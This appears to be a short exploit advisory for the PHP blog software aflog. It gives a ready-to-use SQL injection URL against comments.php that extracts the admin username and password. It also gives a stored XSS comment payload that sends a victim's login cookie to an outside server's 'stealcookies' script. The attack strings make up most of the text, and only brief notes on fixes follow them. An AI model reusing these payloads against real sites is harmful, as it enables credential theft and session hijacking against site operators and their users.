# Description:
#
# SQL INJECTION:
#
# SQL injection is possible in comments.php for the GET variable 'id', like
# this:
http://hostname/aflog/comments.php?id='[SQLI]/*
# The following POC exposes the username and password of the first registered
# user (the admin):

http://localhost/aflog/comments.php?id='+UNION+SELECT+666,null,concat('username:',username,',password:',password),1,null,1+FROM+members+ORDER+BY+id+DESC+LIMIT+1/*

#
# The same principle could be applied to view.php, but forming the SQL
# injection string is easier in comments.php, IMHO.
#
# NOTE:
# A possible sollution to this is setting magic_quotes_gpc to "on" but this is
# viable to cause other problems, so a patch to aflog would be more benefitial.

#
# XSS
#
# The comment form doesn't do much parsing on comments posted, other than their
# length.
#
# A newly registered user can easily compose an URL with an XSS exploit and
# trick a logged in user to click it to steal their login cookie.
#
#   Example comment:

Don't go <script>var a="<a
href='http://server/stealcookies?"+encodeURI(document.cookie)+"'>here</a>";document.write(a);</script>.

#
# Cliking this link would send the login cookie as a GET request to 'server' to
# be processed by a script called 'stealcookies'
#
# Good luck, and be safe. Greetings to the light of my life, innoscent.
